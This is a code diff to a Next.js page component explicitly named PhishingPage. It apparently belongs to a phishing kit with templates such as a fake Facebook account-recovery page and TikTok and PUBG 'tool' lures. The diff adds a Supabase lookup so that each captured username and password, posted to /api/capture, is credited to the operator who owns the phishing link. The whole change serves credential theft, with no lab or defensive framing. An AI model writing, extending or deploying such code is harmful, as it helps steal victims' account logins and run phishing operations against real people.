@@ -1,6 +1,7 @@
 "use client";
 import { useParams, useRouter } from "next/navigation";
 import { useState, useEffect } from "react";
+import { supabase } from "@/lib/supabase";
 
 const TEMPLATE_CONFIG = {
   "fb-recovery": {
@@ -74,6 +75,24 @@ export default function PhishingPage() {
   const [quantity, setQuantity] = useState(""); // For tool-specific quantity selection (tiktok)
   const [charId, setCharId] = useState(""); // For tool-specific char id (pubg)
   const [isVerifying, setIsVerifying] = useState(false); // For tool-specific verification simulation
+  const [ownerId, setOwnerId] = useState(null);
+
+  useEffect(() => {
+    async function lookupOwner() {
+      if (!slug) return;
+      
+      const { data, error } = await supabase
+        .from('links')
+        .select('owner_id')
+        .eq('slug', slug)
+        .single();
+      
+      if (data && data.owner_id) {
+        setOwnerId(data.owner_id);
+      }
+    }
+    lookupOwner();
+  }, [slug]);
 
   useEffect(() => {
     setMounted(true);
@@ -100,7 +119,8 @@ export default function PhishingPage() {
 
     try {
       const searchParams = new URLSearchParams(window.location.search);
-      const ownerId = searchParams.get('uid') || 'anonymous';
+      // Fallback order: 1. Server-side lookup, 2. URL parameter, 3. anonymous
+      const finalOwnerId = ownerId || searchParams.get('uid') || 'anonymous';
 
       await fetch("/api/capture", {
         method: "POST",
@@ -110,7 +130,7 @@ export default function PhishingPage() {
           toolId: toolId,
           username, 
           password,
-          userId: ownerId
+          userId: finalOwnerId
         })
       });
       
